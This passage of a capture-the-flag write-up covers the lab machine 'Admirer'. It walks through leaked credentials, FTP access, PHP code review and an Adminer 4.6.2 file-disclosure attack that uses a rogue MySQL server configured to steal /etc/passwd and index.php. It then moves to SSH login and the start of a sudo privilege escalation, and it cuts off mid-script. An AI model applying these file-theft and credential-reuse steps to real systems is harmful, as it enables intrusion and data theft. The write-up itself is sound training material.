+</code></pre><p>And at http://10.10.10.187/admin-dir/credentials.txt we have some creds:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=display:flex><span><span style=color:#66d9ef>[Internal mail account]</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>w.cooper@admirer.htb</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>fgJr6q#S\W:$P</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>[FTP account]</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>ftpuser</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>%n?4Wz}R$tTF7</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>[Wordpress account]</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>admin</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>w0rdpr3ss01!</span>
+</span></span></code></pre></div><h3 id=ftp-access>FTP access<a hidden class=anchor aria-hidden=true href=#ftp-access>#</a></h3><p>As the FTP port is open we can try to access it with the credentials.</p><p>Let&rsquo;s launch <a href=https://filezilla-project.org/>FileZilla</a> to download the files.</p><p>It&rsquo;s also possible to use the CLI:</p><pre tabindex=0><code>$ ftp 10.10.10.187
+Connected to 10.10.10.187.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.187:cyfun): ftpuser
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-x---    2 0        111          4096 Dec 03  2019 .
+drwxr-x---    2 0        111          4096 Dec 03  2019 ..
+-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
+-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
+</code></pre><p><code>dump.sql</code> contains the table of images displayed on the home page, nothing
+interesting except the db name <code>admirerdb</code> and knowing it&rsquo;s served on localhost.</p><p>Let&rsquo;s extract the website source:</p><pre tabindex=0><code>$ mkdir website &amp;&amp; tar xaf html.tar.gz -C website
+</code></pre><p>There is a <code>w4ld0s_s3cr3t_d1r</code> fodler which is the same as <code>admin-dir</code> and
+contains the same files except that there is one entry more in <code>credentials.txt</code>.</p><pre tabindex=0><code>$ ls -l website
+total 28
+drwxr-x--- 6 cyfun cyfun 4096 juin   6  2019 assets
+drwxr-x--- 4 cyfun cyfun 4096 d├⌐c.   2  2019 images
+-rw-r----- 1 cyfun cyfun 4613 d├⌐c.   3  2019 index.php
+-rw-r----- 1 cyfun cyfun  134 d├⌐c.   1  2019 robots.txt
+drwxr-x--- 2 cyfun cyfun 4096 d├⌐c.   2  2019 utility-scripts
+drwxr-x--- 2 cyfun cyfun 4096 d├⌐c.   2  2019 w4ld0s_s3cr3t_d1r
+</code></pre><p><code>credentials.txt</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=display:flex><span><span style=color:#66d9ef>[Bank Account]</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>waldo.11</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Ezy]m27}OREc$</span>
+</span></span></code></pre></div><p>We can now read the PHP part of <code>index.php</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>  $servername <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;localhost&#34;</span>;
+</span></span><span style=display:flex><span>  $username <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;waldo&#34;</span>;
+</span></span><span style=display:flex><span>  $password <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;]F7jLHw:*G&gt;UPrTo}~A&#34;</span><span style=color:#a6e22e>d6b</span><span style=color:#e6db74>&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  </span><span style=color:#e6db74>$dbname</span><span style=color:#e6db74> = &#34;</span><span style=color:#a6e22e>admirerdb</span><span style=color:#e6db74>&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  // Create connection
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  </span><span style=color:#e6db74>$conn</span><span style=color:#e6db74> = new mysqli(</span><span style=color:#e6db74>$servername</span><span style=color:#e6db74>, </span><span style=color:#e6db74>$username</span><span style=color:#e6db74>, </span><span style=color:#e6db74>$password</span><span style=color:#e6db74>, </span><span style=color:#e6db74>$dbname</span><span style=color:#e6db74>);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  // Check connection
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  if (</span><span style=color:#e6db74>$conn-&gt;connect_error</span><span style=color:#e6db74>) {
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      die(&#34;</span><span style=color:#a6e22e>Connection</span> <span style=color:#a6e22e>failed</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34; . </span><span style=color:#e6db74>$conn-&gt;connect_error</span><span style=color:#e6db74>);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  }
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  </span><span style=color:#e6db74>$sql</span><span style=color:#e6db74> = &#34;</span><span style=color:#a6e22e>SELECT</span> <span style=color:#f92672>*</span> <span style=color:#a6e22e>FROM</span> <span style=color:#a6e22e>items</span><span style=color:#e6db74>&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  </span><span style=color:#e6db74>$result</span><span style=color:#e6db74> = </span><span style=color:#e6db74>$conn-&gt;query</span><span style=color:#e6db74>(</span><span style=color:#e6db74>$sql</span><span style=color:#e6db74>);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  if (</span><span style=color:#e6db74>$result-&gt;num_rows</span><span style=color:#e6db74> &gt; 0) {
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    // output data of each row
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    while(</span><span style=color:#e6db74>$row</span><span style=color:#e6db74> = </span><span style=color:#e6db74>$result-&gt;fetch_assoc</span><span style=color:#e6db74>()) {
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      echo &#34;</span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>article</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;thumb&#39;</span><span style=color:#f92672>&gt;</span><span style=color:#e6db74>&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      echo &#34;</span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#34;.$row[&#34;image_path&#34;].&#34;&#39;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;image&#39;</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#34;.$row[&#34;thumb_path&#34;].&#34;&#39;</span> <span style=color:#a6e22e>alt</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span> <span style=color:#f92672>/&gt;&lt;/</span><span style=color:#a6e22e>a</span><span style=color:#f92672>&gt;</span><span style=color:#e6db74>&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      echo &#34;</span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>h2</span><span style=color:#f92672>&gt;</span><span style=color:#e6db74>&#34;.</span><span style=color:#e6db74>$row[&#34;title&#34;]</span><span style=color:#e6db74>.&#34;</span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>h2</span><span style=color:#f92672>&gt;</span><span style=color:#e6db74>&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      echo &#34;</span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>p</span><span style=color:#f92672>&gt;</span><span style=color:#e6db74>&#34;.</span><span style=color:#e6db74>$row[&#34;text&#34;]</span><span style=color:#e6db74>.&#34;</span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>p</span><span style=color:#f92672>&gt;</span><span style=color:#e6db74>&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      echo &#34;</span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>article</span><span style=color:#f92672>&gt;</span><span style=color:#e6db74>&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    }
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  } else {
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    echo &#34;</span><span style=color:#ae81ff>0</span> <span style=color:#a6e22e>results</span><span style=color:#e6db74>&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  }
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  </span><span style=color:#e6db74>$conn-&gt;close</span><span style=color:#e6db74>();
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>?&gt;
+</span></span></span></code></pre></div><p>That gives us the MariaDB credentials.</p><p>But what will interest us more is what&rsquo;s inside <code>utility-scripts</code>
+(accessible publicly).</p><pre tabindex=0><code>website/utility-scripts
+Γö£ΓöÇΓöÇ admin_tasks.php
+Γö£ΓöÇΓöÇ db_admin.php
+Γö£ΓöÇΓöÇ info.php
+ΓööΓöÇΓöÇ phptest.php
+</code></pre><p>So we have:</p><ul><li><code>admin_tasks.php</code>: an admin toolkit that is probably vulnerable and we&rsquo;ll use to gain a shell</li><li><code>db_admin.php</code>: leaking MariaDB credentials, it&rsquo;s the same user as in <code>index.php</code> but the password is different, one of the two must be outdated.</li><li><code>info.php</code>: a <code>phpinfo()</code><ul><li><code>DOCUMENT_ROOT</code>: <code>/var/www/html</code></li><li><code>disable_functions</code>: default</li><li><code>open_basedir</code>: <code>/var/www/html</code></li></ul></li><li><code>phptest.php</code>: a dummy file</li></ul><h3 id=code-review>Code review<a hidden class=anchor aria-hidden=true href=#code-review>#</a></h3><p>Here is the list of possible operations:</p><pre tabindex=0><code>Available options:
+  1) View system uptime
+  2) View logged in users
+  3) View crontab (current user only)
+  4) Backup passwd file (not working)
+  5) Backup shadow file (not working)
+  6) Backup web data (not working)
+  7) Backup database (not working)
+
+  NOTE: Options 4-7 are currently NOT working because they need root privileges.
+        I&#39;m leaving them in the valid tasks in case I figure out a way
+        to securely run code as root from a PHP page.
+</code></pre><p>And that&rsquo;s the vulnerable code without the comments and HTML:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>  <span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_REQUEST[<span style=color:#e6db74>&#39;task&#39;</span>]))
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    $task <span style=color:#f92672>=</span> $_REQUEST[<span style=color:#e6db74>&#39;task&#39;</span>];
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>($task <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;1&#39;</span> <span style=color:#f92672>||</span> $task <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;2&#39;</span> <span style=color:#f92672>||</span> $task <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;3&#39;</span> <span style=color:#f92672>||</span> $task <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;4&#39;</span> <span style=color:#f92672>||</span>
+</span></span><span style=display:flex><span>       $task <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;5&#39;</span> <span style=color:#f92672>||</span> $task <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;6&#39;</span> <span style=color:#f92672>||</span> $task <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;7&#39;</span>)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;&lt;br /&gt;&#34;</span>, <span style=color:#a6e22e>shell_exec</span>(<span style=color:#e6db74>&#34;/opt/scripts/admin_tasks.sh </span><span style=color:#e6db74>$task</span><span style=color:#e6db74> 2&gt;&amp;1&#34;</span>));
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>echo</span>(<span style=color:#e6db74>&#34;Invalid task.&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span></code></pre></div><p>The task number is directly passed into a <code>shell_exec()</code> without any security
+so we would have been able to do a system command injection if task was not
+compared to a whitelist of allowed task number. It&rsquo;s a loose comparison so
+there is maybe a way to bypass it.</p><h3 id=adminer-exploitation>Adminer exploitation<a hidden class=anchor aria-hidden=true href=#adminer-exploitation>#</a></h3><p>In the end <code>admin_tasks.php</code> seems to be a rabbit hole.</p><p>Now there is a step requiring guessing. In <code>db_admin.php</code> there is a comment:</p><blockquote><p>TODO: Finish implementing this or find a better open source alternative</p></blockquote><p>http://10.10.10.187/utility-scripts/db_admin.php gives a 404, so maybe the dev
+found an alternative.</p><p>An alternative to <code>db_admin.php</code> is Adminer (formerly phpMinAdmin) that is
+similar to phpMyAdmin. Also Adminer is the name of the box&mldr;</p><p>From <a href=https://www.adminer.org/>adminer.org</a></p><blockquote><p>Adminer (formerly phpMinAdmin) is a full-featured database management tool written in PHP. Conversely to phpMyAdmin, it consist of a single file ready to deploy to the target server. Adminer is available for MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Firebird, SimpleDB, Elasticsearch and MongoDB.</p></blockquote><p>We can access to http://10.10.10.187/utility-scripts/adminer.php</p><p>But we can&rsquo;t login with both set of credentials we found earlier.</p><p>We are using Adminer 4.6.2, so let&rsquo;s see if there are security fix in 4.6.3.</p><p>Ref. <a href=https://sourceforge.net/p/adminer/news/2018/06/adminer-463-released/>changelog</a></p><p>We can see <code>MySQL: Disallow LOAD DATA LOCAL INFILE</code> which was used in
+<a href=https://www.acunetix.com/vulnerabilities/web/adminer-4-6-2-file-disclosure-vulnerability/>Adminer 4.6.2 file disclosure vulnerability</a>.</p><blockquote><p>Adminer versions up to (and including) 4.6.2 supported the use of the SQL statement LOAD DATA INFILE. It was possible to use this SQL statement to read arbitrary local files because of a protocol flaw in MySQL.</p></blockquote><p>So let&rsquo;s read the associated references:</p><ul><li><a href=https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability>Adminer leaks passwords; Magecart hackers rejoice</a></li><li><a href=https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f>Adminer Script Results to Pwning Server?, Private Bug Bounty Program</a></li></ul><p>So we need to host a database and access it remotely from Adminer.</p><p>By searching around, I found this msf issue:
+<a href=https://github.com/rapid7/metasploit-framework/issues/12222>[Suggestion] Add rogue MySQL server for file theft</a>.
+bcoles asked msf team to create of rogue server module for this kind of exploit.
+There is still nothing in msf but the author gave an example with this python
+script: <a href=https://github.com/Gifts/Rogue-MySql-Server>https://github.com/Gifts/Rogue-MySql-Server</a></p><p>Let&rsquo;s run it so start the fake database as a daemon:</p><pre tabindex=0><code>$ python2 rogue_mysql_server.py
+</code></pre><p>In <code>rogue_mysql_server.py</code> I changed the filelist to read <code>/etc/passwd</code> instead
+of <code>c:\windows\win.ini</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>filelist <span style=color:#f92672>=</span> (
+</span></span><span style=display:flex><span><span style=color:#75715e>#    r&#39;c:\boot.ini&#39;,</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#    r&#39;c:\windows\win.ini&#39;,</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#    r&#39;c:\windows\system32\drivers\etc\hosts&#39;,</span>
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;/etc/passwd&#39;</span>,
+</span></span><span style=display:flex><span><span style=color:#75715e>#    &#39;/etc/shadow&#39;,</span>
+</span></span><span style=display:flex><span>)
+</span></span></code></pre></div><p>We can login by setting our IP address and put whatever credentials.</p><p>Yet we can&rsquo;t read <code>/etc/passwd</code> because of open_basedir value.</p><p>The file we need to read is <code>index.php</code> with the up-to-date credentials.</p><p>We can change <code>filelist</code> (add <code>'/var/www/html/index.php'</code>) again and restart the rogue server.</p><p>Then if we read the rogue server&rsquo;s logs:</p><pre tabindex=0><code>$ cat mysql.log | grep password
+...
+$password = &#34;&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;&#34;;
+...
+</code></pre><p>The we can re-use those credentials over SSH:</p><pre tabindex=0><code>$ ssh waldo@10.10.10.187
+waldo@10.10.10.187&#39;s password:
+Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux
+
+The programs included with the Devuan GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+Last login: Sun Jul 12 16:20:44 2020 from 10.10.14.36
+waldo@admirer:~$
+</code></pre><h3 id=privilege-escalation-of-machine>Privilege Escalation of Machine<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine>#</a></h3><p>The way to follow seems obvious:</p><pre tabindex=0><code>waldo@admirer:~$ sudo -l
+[sudo] password for waldo:
+Matching Defaults entries for waldo on admirer:
+    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always
+
+User waldo may run the following commands on admirer:
+    (ALL) SETENV: /opt/scripts/admin_tasks.sh
+</code></pre><p>So let&rsquo;s read the script <code>/opt/scripts/admin_tasks.sh</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>view_uptime<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>    /usr/bin/uptime -p
+</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>view_users<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>    /usr/bin/w
+</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>view_crontab<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>    /usr/bin/crontab -l
+</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>backup_passwd<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> <span style=color:#e6db74>&#34;</span>$EUID<span style=color:#e6db74>&#34;</span> -eq <span style=color:#ae81ff>0</span> <span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Backing up /etc/passwd to /var/backups/passwd.bak...&#34;</span>
+</span></span><span style=display:flex><span>        /bin/cp /etc/passwd /var/backups/passwd.bak
+</span></span><span style=display:flex><span>        /bin/chown root:root /var/backups/passwd.bak
+</span></span><span style=display:flex><span>        /bin/chmod <span style=color:#ae81ff>600</span> /var/backups/passwd.bak
+</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Done.&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Insufficient privileges to perform the selected operation.&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>backup_shadow<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> <span style=color:#e6db74>&#34;</span>$EUID<span style=color:#e6db74>&#34;</span> -eq <span style=color:#ae81ff>0</span> <span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Backing up /etc/shadow to /var/backups/shadow.bak...&#34;</span>
+</span></span><span style=display:flex><span>        /bin/cp /etc/shadow /var/backups/shadow.bak
+</span></span><span style=display:flex><span>        /bin/chown root:shadow /var/backups/shadow.bak
+</span></span><span style=display:flex><span>        /bin/chmod <span style=color:#ae81ff>600</span> /var/backups/shadow.bak
+</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Done.&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Insufficient privileges to perform the selected operation.&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>backup_web<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> <span style=color:#e6db74>&#34;</span>$EUID<span style=color:#e6db74>&#34;</span> -eq <span style=color:#ae81ff>0</span> <span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Running backup script in the background, it might take a while...&#34;</span>
+</span></span><span style=display:flex><span>        /opt/scripts/backup.py &amp;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Insufficient privileges to perform the selected operation.&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>backup_db<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> <span style=color:#e6db74>&#34;</span>$EUID<span style=color:#e6db74>&#34;</span> -eq <span style=color:#ae81ff>0</span> <span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Running mysqldump in the background, it may take a while...&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>#/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp;</span>
+</span></span><span style=display:flex><span>        /usr/bin/mysqldump -u root admirerdb &gt; /var/backups/dump.sql &amp;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Insufficient privileges to perform the selected operation.&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Non-interactive way, to be used by the web interface</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> $# -eq <span style=color:#ae81ff>1</span> <span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>    option<span style=color:#f92672>=</span>$1
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> $option in
+</span></span><span style=display:flex><span>        1<span style=color:#f92672>)</span> view_uptime ;;
+</span></span><span style=display:flex><span>        2<span style=color:#f92672>)</span> view_users ;;
+</span></span><span style=display:flex><span>        3<span style=color:#f92672>)</span> view_crontab ;;
+</span></span><span style=display:flex><span>        4<span style=color:#f92672>)</span> backup_passwd ;;
+</span></span><span style=display:flex><span>        5<span style=color:#f92672>)</span> backup_shadow ;;
+</span></span><span style=display:flex><span>        6<span style=color:#f92672>)</span> backup_web ;;
+</span></span><span style=display:flex><span>        7<span style=color:#f92672>)</span> backup_db ;;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        *<span style=color:#f92672>)</span> echo <span style=color:#e6db74>&#34;Unknown option.&#34;</span> &gt;&amp;<span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>esac</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    exit <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Interactive way, to be called from the command line</span>
+</span></span><span style=display:flex><span>options<span style=color:#f92672>=(</span><span style=color:#e6db74>&#34;View system uptime&#34;</span>
+</span></span><span style=display:flex><span>         <span style=color:#e6db74>&#34;View logged in users&#34;</span>
+</span></span><span style=display:flex><span>         <span style=color:#e6db74>&#34;View crontab&#34;</span>
+</span></span><span style=display:flex><span>         <span style=color:#e6db74>&#34;Backup passwd file&#34;</span>
+</span></span><span style=display:flex><span>         <span style=color:#e6db74>&#34;Backup shadow file&#34;</span>
+</span></span><span style=display:flex><span>         <span style=color:#e6db74>&#34;Backup web data&#34;</span>
+</span></span><span style=display:flex><span>         <span style=color:#e6db74>&#34;Backup DB&#34;</span>
+</span></span><span style=display:flex><span>         <span style=color:#e6db74>&#34;Quit&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>echo
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[[[ System Administration Menu ]]]&#34;</span>
+</span></span><span style=display:flex><span>PS3<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Choose an option: &#34;</span>
+</span></span><span style=display:flex><span>COLUMNS<span style=color:#f92672>=</span><span style=color:#ae81ff>11</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>select</span> opt in <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>options[@]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> $REPLY in
+</span></span><span style=display:flex><span>        1<span style=color:#f92672>)</span> view_uptime ; break ;;
+</span></span><span style=display:flex><span>        2<span style=color:#f92672>)</span> view_users ; break ;;
+</span></span><span style=display:flex><span>        3<span style=color:#f92672>)</span> view_crontab ; break ;;
+</span></span><span style=display:flex><span>        4<span style=color:#f92672>)</span> backup_passwd ; break ;;
+</span></span><span style=display:flex><span>        5<span style=color:#f92672>)</span> backup_shadow ; break ;;
+</span></span><span style=display:flex><span>        6<span style=color:#f92672>)</span> backup_web ; break ;;
+</span></span><span style=display:flex><span>        7<span style=color:#f92672>)</span> backup_db ; break ;;
+</span></span><span style=display:flex><span>        8<span style=color:#f92672>)</span> echo <span style=color:#e6db74>&#34;Bye!&#34;</span> ; break ;;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        *<span style=color:#f92672>)</span> echo <span style=color:#e6db74>&#34;Unknown option.&#34;</span> &gt;&amp;<span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>esac</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>exit <span style=color:#ae81ff>0</span>
+</span></span></code></pre></div><p><code>backup_shadow</code> and <code>backup_passwd</code> seem secure, <code>backup_db</code> won&rsquo;t help us so
+let&rsquo;s dig in <code>backup_web</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>backup_web<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
